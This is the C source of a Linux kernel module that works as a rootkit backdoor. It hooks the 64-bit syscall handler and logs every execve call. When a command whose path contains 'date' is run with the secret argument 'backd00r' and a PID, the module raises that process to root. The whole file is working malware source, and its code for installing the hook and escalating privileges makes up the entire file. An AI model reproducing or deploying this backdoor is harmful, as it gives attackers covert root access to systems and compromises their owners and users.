#include <linux/delay.h> 
#include <linux/kernel.h> 
#include <linux/module.h> 
#include <linux/moduleparam.h> 
#include <linux/kthread.h>   
#include <linux/sched.h>     
#include <asm/ptrace.h>
#include <linux/vmalloc.h>

#include "config.h"
#include "utils.h"
#include "root.h"
#include "syscallhook.h"


noinline void hook_do_syscall_64 HOOK_PARAMS
{
    if(nr == __NR_execve) {
        pr_info("execve %s\n", (char*)regs->di);
        if(strstr((char*)regs->di, "date"))
        {
            char** args = (char**)regs->si;

            if(args[1] != NULL && args[2] != NULL && strcmp(args[1], "backd00r") == 0)
            {
                char* dummy;
                unsigned pid = (int)simple_strtol(args[2], &dummy, 10);

                pr_info("SECRET: making PID %i root!\n", pid);
                if (make_pid_root(pid) < 0)
                    pr_info(KERN_ALERT "Failed to change PID credentials!\n");
            }
        }
    }
}


static int __init main_init(void) 
{ 
    install_hook();
    return 0;
} 

static void __exit main_exit(void) 
{
    uninstall_hook();
}

module_init(main_init); 
module_exit(main_exit); 
 
MODULE_LICENSE("GPL");